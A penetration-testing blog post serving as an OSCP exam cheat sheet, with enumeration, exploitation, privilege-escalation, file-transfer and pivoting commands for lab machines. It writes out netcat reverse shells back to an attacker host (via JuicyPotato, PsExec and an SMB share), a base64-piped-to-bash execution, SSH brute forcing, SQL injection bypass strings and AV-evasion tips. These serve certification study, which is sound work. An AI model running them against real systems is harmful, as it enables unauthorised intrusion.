<!doctype html><html lang=en>
<head>
<meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="ie=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=author content="map[name:Cas van Cooten]">
<meta name=description content="Updated May 18th, 2020
Since my OSCP certification exam is coming up, I decided to do a writeup of the commands and techniques I have most frequently used in the PWK labs and in similar machines. I aimed for it to be a basic command reference, but in writing it it has grown out to be a bit more than that!
That being said - it is far from an exhaustive list.">
<meta name=keywords content="homepage,blog,cas van cooten,security,hacking,PWK,OSCP,Hacking">
<meta name=robots content="noodp">
<meta name=theme-color content>
<link rel=canonical href=https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/>
<title>
OSCP Cheat Sheet and Command Reference :: Cas van Cooten
</title>
<link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css>
<link rel=stylesheet href=/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css>
<link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png>
<link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png>
<link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png>
<link rel=manifest href=/site.webmanifest>
<link rel=mask-icon href=/safari-pinned-tab.svg color>
<link rel="shortcut icon" href=/favicon.ico>
<meta name=msapplication-TileColor content>
<meta itemprop=name content="OSCP Cheat Sheet and Command Reference">
<meta itemprop=description content="Updated May 18th, 2020
Since my OSCP certification exam is coming up, I decided to do a writeup of the commands and techniques I have most frequently used in the PWK labs and in similar machines. I aimed for it to be a basic command reference, but in writing it it has grown out to be a bit more than that!
That being said - it is far from an exhaustive list."><meta itemprop=datePublished content="2020-05-03T00:00:00+00:00">
<meta itemprop=dateModified content="2022-02-22T20:09:33+00:00">
<meta itemprop=wordCount content="3778"><meta itemprop=image content="https://casvancooten.com/preview.png">
<meta itemprop=keywords content="PWK,OSCP,Hacking,">
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="https://casvancooten.com/preview.png">
<meta name=twitter:title content="OSCP Cheat Sheet and Command Reference">
<meta name=twitter:description content="Updated May 18th, 2020
Since my OSCP certification exam is coming up, I decided to do a writeup of the commands and techniques I have most frequently used in the PWK labs and in similar machines. I aimed for it to be a basic command reference, but in writing it it has grown out to be a bit more than that!
That being said - it is far from an exhaustive list.">
<meta property="og:title" content="OSCP Cheat Sheet and Command Reference">
<meta property="og:description" content="Updated May 18th, 2020
Since my OSCP certification exam is coming up, I decided to do a writeup of the commands and techniques I have most frequently used in the PWK labs and in similar machines. I aimed for it to be a basic command reference, but in writing it it has grown out to be a bit more than that!
That being said - it is far from an exhaustive list.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/"><meta property="og:image" content="https://casvancooten.com/preview.png"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2020-05-03T00:00:00+00:00">
<meta property="article:modified_time" content="2022-02-22T20:09:33+00:00">
<meta property="og:see_also" content="https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/">
<meta property="article:published_time" content="2020-05-03 00:00:00 +0000 UTC">
</head>
<body>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/ style=text-decoration:none>
<div class=logo>
<span class=logo__mark>></span>
<span class=logo__text>Security Ramblings</span>
<span class=logo__cursor>
</span>
</div>
</a>
<span class=header__right>
<nav class=menu>
<ul class=menu__inner><li><a href=/about/>About</a></li><li><a href=/posts/>Blog</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span>
</span>
</span>
</header>
<div class=content>
<main class=post>
<div class=post-info>
<p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
18 minutes
</p>
</div>
<article>
<h1 class=post-title>
<a href=https://casvancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/>OSCP Cheat Sheet and Command Reference</a>
</h1>
<hr>
<aside id=toc>
<div class=toc-title>Table of Contents</div>
<nav id=TableOfContents>
<ul>
<li><a href=#reconnaissance>Reconnaissance</a>
<ul>
<li><a href=#full-tcp-nmap>Full TCP nmap</a></li>
<li><a href=#udp-nmap>UDP nmap</a></li>
</ul>
</li>
<li><a href=#enumeration>Enumeration</a>
<ul>
<li><a href=#ftp-21tcp>FTP (21/tcp)</a></li>
<li><a href=#ssh-22tcp>SSH (22/tcp)</a></li>
<li><a href=#smtp-25tcp>SMTP (25/tcp)</a></li>
<li><a href=#dns-53tcp>DNS (53/tcp)</a></li>
<li><a href=#rpc--nfs-111tcp>RPC / NFS (111/tcp)</a></li>
<li><a href=#samba-139tcp-and-445tcp>S(a)MB(a) (139/tcp and 445/tcp)</a></li>
<li><a href=#snmp-161udp>SNMP (161/udp)</a></li>
<li><a href=#https-80tcp-443tcp-8000tcp-8080tcp-8443tcp->HTTP(S) (80/tcp, 443/tcp, 8000/tcp, 8080/tcp, 8443/tcp, &mldr;)</a></li>
<li><a href=#searchsploit>Searchsploit</a></li>
<li><a href=#all-in-one>All-in-one</a></li>
</ul>
</li>
<li><a href=#exploitation>Exploitation</a>
<ul>
<li><a href=#directory-traversal-and-local-file-inclusion>Directory Traversal and (Local) File Inclusion</a></li>
<li><a href=#sql-injection>SQL Injection</a></li>
<li><a href=#other-web-based-exploits>Other Web-Based Exploits</a></li>
<li><a href=#hashes-and-known-credentials>Hashes and (Known) Credentials</a></li>
</ul>
</li>
<li><a href=#privilege-escalation>Privilege Escalation</a>
<ul>
<li><a href=#windows>Windows</a></li>
<li><a href=#linux>Linux</a></li>
</ul>
</li>
<li><a href=#file-transfers>File Transfers</a>
<ul>
<li><a href=#windows-1>Windows</a></li>
<li><a href=#linux-1>Linux</a></li>
</ul>
</li>
<li><a href=#pivoting>Pivoting</a></li>
<li><a href=#post-exploitation-enumeration>Post-exploitation Enumeration</a></li>
<li><a href=#buffer-overflows>Buffer Overflows</a>
<ul>
<li><a href=#fuzz-buffer-length>Fuzz buffer length</a></li>
<li><a href=#find-eip-offset>Find EIP offset</a></li>
<li><a href=#determine-slack-space>Determine &lsquo;slack space&rsquo;</a></li>
<li><a href=#find-bad-chars>Find bad chars</a></li>
<li><a href=#find-suitable-memory-address>Find suitable memory address</a></li>
<li><a href=#generate-shellcode>Generate shellcode</a></li>
<li><a href=#add-nop-sled>Add NOP sled</a></li>
<li><a href=#finalize-exploit>Finalize exploit</a></li>
</ul>
</li>
</ul>
</nav>
</aside>
<hr>
<div class=post-content>
<p><em>Updated <strong>May 18th, 2020</strong></em></p>
<p>Since my OSCP certification exam is coming up, I decided to do a writeup of the commands and techniques I have most frequently used in the PWK labs and in similar machines. I aimed for it to be a basic command reference, but in writing it it has grown out to be a bit more than that!</p>
<p>That being said - it is <em>far from</em> an exhaustive list. If you feel any important tips, tricks, commands or techniques are missing from this list just get in touch on <a href=https://twitter.com/chvancooten>Twitter</a>!</p>
<h2 id=reconnaissance>Reconnaissance</h2>
<h3 id=full-tcp-nmap>Full TCP nmap</h3>
<p>Enumerate ALL ports and services to identify low hanging fruit, and get the full list of services that you need to look into during enumeration.</p>
<pre tabindex=0><code>nmap -sV -sC -p- -o nmap.out -vvv $RHOST
</code></pre><h3 id=udp-nmap>UDP nmap</h3>
<p>It&rsquo;s always good to check the top UDP ports. OffSec seems to like the &ldquo;hidden UDP gems&rdquo; SNMP and TFTP.</p>
<pre tabindex=0><code>nmap -sU --top-ports 20 -o nmap-udp.out -vvv $RHOST
</code></pre><h2 id=enumeration>Enumeration</h2>
<p>This is an <em>explicitly non-exhaustive</em> list of things to try on different services that are identified. In my experience, these are some of the most-used services for PWK, though. Hit me up if you feel anything is missing from this list!</p>
<blockquote>
<p>Rule #1: üëèENUMERATEüëèEVERYTHINGüëè</p>
</blockquote>
<h3 id=ftp-21tcp>FTP (21/tcp)</h3>
<p>Check for anonymous login, try credentials if you have them. Sometimes the FTP server is vulnerable itself - refer to &lsquo;Searchsploit&rsquo;.</p>
<h3 id=ssh-22tcp>SSH (22/tcp)</h3>
<p>Try credentials if you have them. Usually not too exploitable, unless you encounter a really old version. You may encounter scenarios where the private key is <a href=https://github.com/g0tmi1k/debian-ssh>predictable</a> or you have a public key with <a href=https://github.com/Ganapati/RsaCtfTool>weak crypto</a>.</p>
<p>In some instances, SSH may be an entry point using weak credentials. If you know several possible usernames on the system, try those out with weak credentials, such as the username as the password or common passwords.</p>
<pre tabindex=0><code>hydra -l $USERNAME -P /usr/share/wordlists/wfuzz/others/common_pass.txt ssh://$RHOST
</code></pre><blockquote>
<p>Bruteforcing live services beyond short password lists or straightforward guesses (blank password, username as password, etc.) is not necessary and never advisable. If you found a hash, see the section on <a href=https://cas.vancooten.com/posts/2020/05/oscp-cheat-sheet-and-command-reference/#hashes-and-known-credentials>hashes and cracking</a>.</p>
</blockquote>
<h3 id=smtp-25tcp>SMTP (25/tcp)</h3>
<p>You may be able to enumerate usernames through SMTP.</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>nc 10.11.1.217 25
[...]
VRFY root
252 2.0.0 root
VRFY idontexist
550 5.1.1 &lt;idontexist&gt;: Recipient address rejected: User unknown in local recipient table
</code></pre></div><h3 id=dns-53tcp>DNS (53/tcp)</h3>
<p>In many cases, you can extract some juicy information from a DNS server. Always attempt to do a zone transfer if you know the target domain.</p>
<pre tabindex=0><code>dig axfr @$RHOST DOMAIN.COM
dnsrecon -d DOMAIN.COM
</code></pre><h3 id=rpc--nfs-111tcp>RPC / NFS (111/tcp)</h3>
<p>RPC is there for a reason, especially on Linux-based machines it may point to NFS.</p>
<p>Enumerate RPC first:</p>
<pre tabindex=0><code>nmap -sV -p 111 --script=rpcinfo $RHOST
</code></pre><p>If you find NFS-related services, enumerate those.</p>
<pre tabindex=0><code>nmap -p 111 --script nfs* $RHOST
</code></pre><p>If you find NFS shares, mount them and see if you can read/write files or change your permissions by adding a new user with a certain UID. If you can&rsquo;t seem to do anything, <em>remember the fact that it is there for later</em>.</p>
<pre tabindex=0><code>mount -t nfs -o vers=3 $RHOST:/SHARENAME /mnt

groupadd --gid 1337 pwn
useradd --uid 1337 -g pwn pwn
</code></pre><h3 id=samba-139tcp-and-445tcp>S(a)MB(a) (139/tcp and 445/tcp)</h3>
<p>Check for &lsquo;null sessions&rsquo; (anonymous login). SMB may be exploitable by e.g. EternalBlue, so carefully check version and OS numbers. For any Windows-based system that exposes port <code>139</code> and/or <code>445</code>, it is worth running <code>enum4linux</code> to perhaps enumerate users on the machine or gain other information.</p>
<p>If you are authenticated and have a writable share, you may be able to <a href=https://www.rapid7.com/db/modules/auxiliary/admin/smb/samba_symlink_traversal>traverse to the root directory</a> if it is Samba (linux).</p>
<h3 id=snmp-161udp>SNMP (161/udp)</h3>
<p>For any UDP port, it&rsquo;s worth verifying if the port is actually open by also running a service and script scan. This increases the odds that nmap is able to verify the service.</p>
<pre tabindex=0><code>sudo nmap -sU -sV -sC --open -p 161 $RHOST
</code></pre><p>If SNMP is running, try extracting information using common community strings. Various tools can help in dumping the data in a readable format.</p>
<pre tabindex=0><code>snmp-check $RHOST
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $RHOST
snmpwalk -v1 -c public $RHOST
</code></pre><h3 id=https-80tcp-443tcp-8000tcp-8080tcp-8443tcp->HTTP(S) (80/tcp, 443/tcp, 8000/tcp, 8080/tcp, 8443/tcp, &mldr;)</h3>
<p>Any ports with a webserver require close enumeration and a high degree of manual inspection. Below are a couple of helpful tools and commands for initial enumeration, but make sure to go through the webpages yourself and review the functionality, parameters in web requests, etc. Use tools such as BurpSuite to play with interesting requests.</p>
<p>It is worth noting that there are several web services and systems that you will be encountering often. Familiarize yourself with systems such as Tomcat or XAMPP, as you will encounter situations where you will have to identify these systems and know to a basic extent how they work.</p>
<h4 id=gobuster>Gobuster</h4>
<p><strong>Extensions</strong></p>
<p>Adapt the extensions (<code>-x</code>) to the web technology and platform (e.g. <code>.html,.php</code> for Linux, <code>.html,.asp,.aspx</code> for Windows). If you have a hint or hunch that other files may be stored on the webserver or in that specific subdirectory, include those. Suggestions are <code>.txt,.php.bak,.old</code> etcetera.</p>
<p><strong>Wordlist</strong></p>
<p>Adapt the wordlist to the specific platform, if applicable. Don&rsquo;t forget about specialized wordlists (e.g. for <a href=https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt>Wordpress</a> or <a href=https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/sharepoint.txt>Sharepoint</a>).</p>
<pre tabindex=0><code>gobuster dir -u $RHOST -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.html -o gobuster.out
</code></pre><h4 id=nikto>Nikto</h4>
<p>Always run Nikto to identify quick wins (hopefully), and gain more insight in the technology stack behind the webpage.</p>
<pre tabindex=0><code>nikto -h $RHOST -o nikto-out.txt
</code></pre><h4 id=sslscan>SSLScan</h4>
<p>May identify some interesting features from the SSL certificate or SSL-based vulnerabilities (Heartbleed) on SSL-enabled services.</p>
<pre tabindex=0><code>sslscan $RHOST
</code></pre><h3 id=searchsploit>Searchsploit</h3>
<p>Search for every service / software version that you manage to identify. Try different combinations of the name and version number of the software. Sometimes I have better results just using Google or the exploit-db search function instead.</p>
<h3 id=all-in-one>All-in-one</h3>
<p>Don&rsquo;t depend on it too much, but <a href=https://github.com/Tib3rius/AutoRecon>AutoRecon</a> is an excellent tool that runs the most common reconnaissance and enumeration steps in one multithreaded process. Output is dumped to a subfolder per target, giving you a clear overview of possible attack vectors.</p>
<h2 id=exploitation>Exploitation</h2>
<p>It&rsquo;s quite difficult to summarize the steps required for exploitation throughout PWK, since so many different vectors may be involved. If you&rsquo;ve done your enumeration well, chances are this phase simply entails downloading an exploit from Exploit-DB, modifying it, and running it to get a (low-privileged) shell. However, you may also have to jump several hurdles before you get to that point, or exploit systems manually altogether.</p>
<p>Below are some of of the things that came to mind at the time of writing. Again - if you have any additions please let me know!</p>
<h3 id=directory-traversal-and-local-file-inclusion>Directory Traversal and (Local) File Inclusion</h3>
<p>You&rsquo;ll likely encounter these in web systems, but possible also as a known vulnerability in other systems such as FTP servers. There are several questions you should ask yourself when this happens.</p>
<p><strong>What type of inclusion am I dealing with?</strong></p>
<p>If you don&rsquo;t yet know, identify whether you are dealing with a remote or local file inclusion (code gets executed, great!) or &lsquo;simply&rsquo; a traversal vulnerability. In general, I&rsquo;d say <code>RFI > LFI > Traversal</code> in terms of exploitability. The first two will likely allow you to execute arbitrary code, which should be enough to net you a shell in most instances (at least for PWK).</p>
<p><strong>What can I read?</strong></p>
<p>If you can &lsquo;only&rsquo; read files, think about what it is you can read to gain a foothold on the machine, or at least progress in your exploitation. First, try and see if you happen to have privileged read access and can read for example <code>/etc/shadow</code> or <code>C:\Users\Administrator\Desktop\Proof.txt</code>. It&rsquo;s a long shot, but it happens. On Windows, don&rsquo;t forget about the <code>SAM</code>, <code>SECURITY</code>, and <code>SYSTEM</code> files and their backups. Those can sometimes get you straight to <code>SYSTEM</code> as well.</p>
<p>If you have limited read access (which will be the majority of times), think about the user context you have read access and juicy files that you can access as them (private SSH keys in user folders, database configuration files in web folders, etc.). Also think about the services you have enumerated on the box, which config files do they have that may be interesting (plaintext credentials, anyone)?</p>
<p>If all else fails, take to online cheat sheets like <a href=https://gracefulsecurity.com/path-traversal-cheat-sheet-windows/>this one</a> for inspiration and just blast ahead üïµ.Ô∏è</p>
<h3 id=sql-injection>SQL Injection</h3>
<p>You will most definitely encounter SQL Injections during PWK. Injections are usually not too complex and should be exploitable manually - so try to avoid <code>SQLMap</code> wherever possible. Make sure you at least have a basic understanding of the SQL syntax that is involved and what is actually going on under the hood, it will make your life a whole lot simpler!</p>
<p>Injections range from simple login bypasses to <code>UNION</code> inclusion queries. They should usually be easily identifiable if you make a habit of fuzzing random symbols (mainly <code>'</code>) in every parameter you see. For (custom) login screens, always try <code>admin</code>:<code>' OR '1'='1</code> and similar queries to see if you get logged in or at least get an unexpected response back.</p>
<h3 id=other-web-based-exploits>Other Web-Based Exploits</h3>
<p>You will encounter other web-based attacks in the PWK labs. Expect to encounter attacks that are common in the OWASP Top 10, such as XSS (especially in relation to client-side exploits) and Command Injection. In general, recognizing the attack points for these types of attacks and having a basic understanding of how they work should be enough to get started. In some cases you will have to get creative with some filter bypasses, but the payloads will never be very advanced.</p>
<p>Another attack that is prevalent with web systems in PWK is uploading (web)shells through write access on the webserver. This takes various forms in the labs, such as admin panels, SQL/command injection, WebDAV access (use <code>cadaver</code>!), or writable FTP/SMB shares which are served via the web server. In these instances, it&rsquo;s a valuable skill to be able to effectively identify the web technology (PHP, ASP(X), etc.) and have a webshell at hand that you can upload (try Kali&rsquo;s <code>/usr/share/webshells</code> directory).</p>
<blockquote>
<p>Personally, I found it to be more effective to upload a <em>basic</em> webshell first and then use that to spawn a new reverse shell. In many cases, if you try to upload a php or asp reverse shell, it will break due to compatibility or encoding issues. This issue hasn&rsquo;t occurred for me when using webshells.</p>
</blockquote>
<h3 id=hashes-and-known-credentials>Hashes and (Known) Credentials</h3>
<p>As mentioned earlier, pure brute forcing is never the answer to anything for PWK. That being said, you will have to crack hashes and sometimes spray passwords at systems to gain a foothold.</p>
<p><strong>Hashes</strong>
Most hashes I encountered during my time in the PWK labs are unsalted (MD5 or (NT)LM) and are as such easy to look up using a tool like <a href=https://crackstation.net/>CrackStation</a>. In some instances, you will have to use John the Ripper or Hashcat to crack some salted hashes. Note that these cases will usually be obvious: if you find hashes that use a very strong algorithm (e.g. <code>$6$</code> SHA512-crypted hashes on Linux) cracking will likely not get you anywhere.</p>
<p><strong>Bruteforcing</strong></p>
<p>Though you won&rsquo;t have to brute force logins in the traditional sense of the word, you will sometimes have to make educated guesses to gain access to a system. As mentioned in the enumeration section above, tools like Hydra or BurpSuite will help in this. Again, only go for the top ranking passwords in common wordlists and other common options such as <code>username:username</code>. If you don&rsquo;t hit a password within 5 minutes, you&rsquo;re looking in the wrong direction.</p>
<p><strong>Password spraying</strong></p>
<p>One of the fun -and frustrating- factors in the PWK labs is the inter-relation between machines. I would strongly recommend keeping an elaborate master-password list of all the passwords and Windows hashes you found, so that you can occasionally use those to see if passwords are re-used anywhere. Tools like Hydra, CrackMapExec, or Metasploit can be used to do this effectively.</p>
<h2 id=privilege-escalation>Privilege Escalation</h2>
<p>Privilege escalation is entirely different for Windows and Linux systems. In general, it pays to have an eye for detail and a large arsenal of tools that can help enumerate and exploit.</p>
<blockquote>
<p>Again, don&rsquo;t forget to üëèENUMERATEüëèEVERYTHINGüëè</p>
</blockquote>
<h3 id=windows>Windows</h3>
<p>I generally check my permissions (<code>whoami /all</code>) and the filesystem (<code>tree /f /a</code> from the <code>C:\Users</code> directory) for quick wins or interesting files (especially user home folder and/or web directories). If I don&rsquo;t find anything, I then run a tool like <code>winPEAS.exe</code> (from <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS>here</a>) to identify any vulnerabilities. Things to look for in enumeration results:</p>
<ul>
<li>Default credentials, try them to pivot to other users.</li>
<li>Open ports, are there any services that are listening on 127.0.0.1 only? Look for exploits.</li>
<li>Running software, what is non-default? Look for exploits.</li>
<li>Unquoted service paths, do they exist? Could you write a malicious binary and restart affected services?</li>
<li>Modifiable service binaries, do they exist? Do they run as <code>SYSTEM</code> or an admin user?</li>
</ul>
<p>If nothing obvious comes out of <code>WinPEAS</code>, I usually run <code>Invoke-AllChecks</code> from <a href=https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc>PowerUp</a>, which does similar checks but sometimes also catches additional vulnerabilities.</p>
<p>If all else fails I start looking for OS-level exploits, especially on older systems. <a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>Windows-Exploit-Suggester</a> helps for this: you can run it from Kali and only need the output of <code>SystemInfo</code>. It also helps to sometimes google for privilege escalation vulnerabilities for the exact OS version - an interesting example I used once for PWK is <a href=https://github.com/apt69/COMahawk>ComaHawk</a> (works on relatively recent Windows 10 systems).</p>
<p>Some other notable examples are discussed in the sections below.</p>
<h4 id=juicypotato>JuicyPotato</h4>
<p>Relevant if you have the <code>SeImpersonatePrivilege</code> and the OS version is <em>older than</em> Server 2019 or Windows 10. I&rsquo;ve had the biggest successes by using a neutral binary such as <code>nc.exe</code> or <code>nc64.exe</code> from <a href=https://eternallybored.org/misc/netcat/>here</a>. If you create a <code>bat</code> file with the command call, it should evade most AV and give you a privileged shell.</p>
<p>Grab a CLSID from <a href=https://ohpe.it/juicy-potato/CLSID/>here</a>, it may take a couple of different attempts to get a working CLSID.</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cmd data-lang=cmd># On target system, after copying required binaries
<span style=color:#6ab825;font-weight:700>echo</span> C:\temp\nc64.exe -e cmd.exe $LHOST 443 &gt; rev.bat
.\JuicyPotato.exe -l 1337 -p C:\temp\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
</code></pre></div><blockquote>
<p>Alternatives to the above are available. Play with tools like <a href=https://github.com/TsukiCTF/Lovely-Potato>LovelyPotato</a> as well, which automate the finding of the CLSID.</p>
</blockquote>
<h4 id=uac-bypass>UAC Bypass</h4>
<p>Relevant if you are a local administrator, but <code>whoami /all</code> returns that you are running in a &ldquo;Medium integrity process&rdquo;. The method of exploitation differs widely per OS version. Googling for automated UAC bypass exploits for a specific version, or using <a href=https://github.com/AonCyberLabs/Windows-Exploit-Suggester>Windows-Exploit-Suggester</a> or metasploit to ID possible UAC bypass vulnerabilities is likely to have success.</p>
<h4 id=local-admin-to-system>Local Admin to SYSTEM</h4>
<p>Even though this is strictly not required for PWK or the OSCP certification exam, I always like to get a full <code>SYSTEM</code> shell. We can realize this with <code>PsExec.exe</code> (from <a href=https://docs.microsoft.com/en-us/sysinternals/downloads/psexec>here</a>). You can use a Msfvenom executable instead of <code>rev.bat</code>, but the latter works better for AV evasion (see <code>JuicyPotato</code>).</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-plaintext data-lang=plaintext>.\PsExec.exe -i -s &#34;c:\temp\rev.bat&#34;
</code></pre></div><blockquote>
<p>If you have a shell on a Windows system and a password for another user, PsExec can also be used to execute programs as the target user.</p>
<pre tabindex=0><code>.\PsExec.exe -user $USERNAME -p $PASSWORD &quot;c:\temp\rev.bat&quot;
</code></pre></blockquote>
<h3 id=linux>Linux</h3>
<p>For Linux PrivEsc, I usually run <code>sudo -l</code>. If this results in certain commands that we can run (without a password or with a known password), I&rsquo;d bet ya that this is your vector. After that, I start looking at the filesystem (again - home directories and interesting directories like <code>/var/www/html</code>) for juicy files or files that contain credentials or clues. Often, this may result in e.g. MySQL credentials that we can use to dump the DB locally. Finally, I look at interesting and/or non-default groups we are in through <code>id</code>.</p>
<p>After that, I usually automate PrivEsc enumeration through <a href=https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS>linPEAS</a> or in some cases <a href=https://github.com/rebootuser/LinEnum>LinEnum</a>. However, I strongly advice everyone to get familiar with the commands that these scripts execute and what they imply. <a href=https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>This</a> is an excellent reference of commands that help in getting situational awareness and identifying vulnerabilities manually. Also, I like the high level questions posed <a href=https://github.com/frizb/Linux-Privilege-Escalation/blob/master/README.md>here</a> - Who am I? What can I read, write, or execute? Some of the questions you have to answer for effective privilege escalation in Linux are similar to Windows, some are entirely different. In general, below are some questions that are often relevant.</p>
<ul>
<li>Are any services or programs running that seem non-default? Are they vulnerable?
<ul>
<li>Pay special attention to services running as the root user (<code>ps auxww | grep root</code>) - in many cases these may be your path to root. E.g., is MySQL running as root? Run <a href=https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf2.c>raptor_udf2</a>.</li>
</ul>
</li>
<li>Which services are listening only locally? Are they vulnerable?</li>
<li>Are permissions on interesting files or folders misconfigured?</li>
<li>Are there any cronjobs or scheduled tasks in place? Who executes them?
<ul>
<li>Note: If you cannot read cron files try <a href=https://github.com/DominicBreuker/pspy>pSpy</a> - it may help in identifying interesting recurrently executed commands.</li>
</ul>
</li>
<li>Can we run <code>sudo</code> on default binaries? Check <a href=https://gtfobins.github.io/>GTFOBins</a> for them.</li>
<li>Are any interesting binaries owned by root with SUID or GUID set? Check GTFOBins for them.</li>
<li>Are there any files with unrestricted POSIX capabilities (just <code>+ep</code>), or other interesting capabilities (such as <code>cap_setuid</code> or <code>cap_dac_override</code>) that we can use for privesc?</li>
<li>If you identified any binaries running recurrently as root or that we can trigger with <code>sudo</code> or in an elevated context: Can we write to that file? Can we hijack the path?</li>
</ul>
<blockquote>
<p>Note: If you run out of options for elevation to root, consider the fact that you may have to move laterally to another user first.</p>
</blockquote>
<p>Again, kernel exploits should be a last resort for PWK privilege escalation. Identifying the kernel version with <code>uname</code> and tossing that into searchsploit should be helpful on that front, but be prepared to start struggling with all types of compiling issues! üíÄ</p>
<h2 id=file-transfers>File Transfers</h2>
<p>There are many tools available for easy file transfers, but these are some of my favorites.</p>
<h3 id=windows-1>Windows</h3>
<p>For Windows, I almost exclusively run or copy from my SMB share. In some cases it works, in some it doesn&rsquo;t. I always try commands in this order:</p>
<ol>
<li>
<p>Impacket-smbserver</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure .

<span style=color:#999;font-style:italic># On target system - copy files</span>
copy <span style=color:#ed9d13>\\</span><span style=color:#40ffff>$LHOST</span><span style=color:#ed9d13>\s</span>ecure<span style=color:#ed9d13>\n</span>c64.exe .
</code></pre></div><p>`</p>
</li>
<li>
<p>Impacket-smbserver (with SMBv2 support)
Seems to work in some cases, if you get a &ldquo;not subscriptable&rdquo; error otherwise.</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>impacket-smbserver secure . -smb2support

<span style=color:#999;font-style:italic># On target system - spawn shell straight from share</span>
<span style=color:#ed9d13>\\</span><span style=color:#40ffff>$LHOST</span><span style=color:#ed9d13>\s</span>ecure<span style=color:#ed9d13>\n</span>c64.exe <span style=color:#40ffff>$LHOST</span> <span style=color:#40ffff>$LPORT</span> -e cmd.exe
</code></pre></div><p>`</p>
</li>
<li>
<p>SMB Daemon
Works most of the time, but is some hassle to set up and doesn&rsquo;t give you NetNTLM hashes as a bonus.</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>service smbd start
</code></pre></div><p>`</p>
</li>
</ol>
<h3 id=linux-1>Linux</h3>
<p>I usually use a simple HTTP server from python to <code>curl</code> or <code>wget</code> files on demand.</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>python3 -m http.server <span style=color:#3677a9>80</span> <span style=color:#999;font-style:italic># Starts a web server in the current directory on port 80</span>
</code></pre></div><p>There are some nice alternatives in case this is not possible. Examples are base64-encoding and netcat.</p>
<div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>cat <span style=color:#40ffff>$FILENAME</span> | base64 <span style=color:#999;font-style:italic>#copy output</span>

<span style=color:#999;font-style:italic># On target</span>
<span style=color:#24909d>echo</span> -n <span style=color:#ed9d13>&#34;</span><span style=color:#40ffff>$BASE64FILE</span><span style=color:#ed9d13>&#34;</span> | base64 -d | bash <span style=color:#999;font-style:italic># run the file in bash</span>
</code></pre></div><div class=highlight><pre tabindex=0 style=color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>nc -lvnp <span style=color:#3677a9>443</span> &lt; <span style=color:#40ffff>$FILENAME</span>

<span style=color:#999;font-style:italic># On target</span>
nc <span style=color:#40ffff>$LHOST</span> <span style=color:#3677a9>443</span> &gt; <span style=color:#40ffff>$FILENAME</span>
</code></pre></div><h2 id=pivoting>Pivoting</h2>
<p>SSH access always gives you the easiest pivot. You can set up a SOCKS proxy by adding the <code>-D</code> flag as follows.</p>
<pre tabindex=0><code>ssh $USERNAME@$RHOST -D 1080
</code></pre><p>This opens a SOCKS proxy on your machine&rsquo;s port 1080, which is proxied to the target system. You can configure to use it with <code>proxychains</code> quite easily.</p>
